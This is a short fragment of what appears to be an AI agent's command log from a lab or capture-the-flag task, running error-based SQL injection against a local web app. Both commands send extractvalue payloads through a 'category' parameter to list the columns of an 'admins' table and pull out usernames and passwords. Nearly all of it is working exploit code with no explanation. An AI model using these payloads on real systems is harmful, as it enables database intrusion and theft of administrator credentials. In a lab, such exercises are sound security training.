input.command:
urlenc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
for q in \
"(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admins')" \
"(SELECT group_concat(concat_ws(':',username,password) SEPARATOR ' | ') FROM admins)" \
; do
echo "== $q =="
curl -s "http://127.0.0.1:32833/?category=$(urlenc "Nature' AND extractvalue(1,concat(0x7e,$q))-- -")" | grep -oE "Error in query[^<]*"
done

state.title: Extract admins columns and data

input.command:
urlenc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
ev(){ curl -s "http://127.0.0.1:32833/?category=$(urlenc "Nature' AND extractvalue(1,concat(0x7e,$1))-- -")" | grep -oE "Error in query[^<]*"; }
for q in \
"(SELECT count(*) FROM admins)" \
"(SELECT length(group_concat(concat_ws(':',id,username,password))) FROM admins)" \
"(SELECT username FROM admins LIMIT 0,1)" \
"(SELECT password FROM admins LIMIT 0,1)" \
; do echo "== $q =="; ev "$q"; done
